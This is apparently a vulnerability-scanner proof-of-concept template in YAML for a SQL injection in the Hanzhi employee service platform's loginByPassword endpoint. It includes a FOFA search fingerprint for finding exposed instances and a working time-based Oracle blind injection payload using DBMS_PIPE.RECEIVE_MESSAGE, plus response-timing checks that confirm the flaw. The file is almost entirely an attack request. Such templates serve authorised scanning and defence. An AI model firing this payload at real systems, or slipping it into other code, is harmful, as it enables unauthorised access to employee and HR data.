id: poc-yaml-hanzhi-loginbypassword-sqli
info:
  name: 翰智员工服务平台 loginByPassword SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 翰智员工服务平台
  fofa: body="./static/hrfonts/iconfont.css"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /hrssc/portal/plantform/loginByPassword
  headers:
    Content-Type: application/json
  data: '{"userName":"''||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE
    7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),{{.t1}}))||''","password":"''"}'
  expression: "status_code == 200 && \ncontains(body,\"\\\"loginSuccess\\\":false\"\
    ) &&\n!contains(body,\"<\") &&\nduration > t1 &&\nduration < t2\n"
transport: http
